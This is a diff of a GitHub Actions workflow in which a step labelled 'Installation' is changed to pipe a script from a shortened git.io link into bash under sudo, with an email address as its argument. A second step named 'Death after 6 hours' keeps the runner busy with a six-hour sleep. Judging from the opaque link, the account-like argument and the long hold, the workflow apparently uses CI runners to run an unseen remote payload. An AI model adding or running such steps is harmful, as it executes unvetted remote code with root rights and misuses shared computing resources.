@@ -9,7 +9,6 @@ jobs:
     
     steps:
     - name: Установка
-      run: |
-        bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
+      run: sudo bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
     - name: Смэрть через 6 часов
       run: sleep 6h
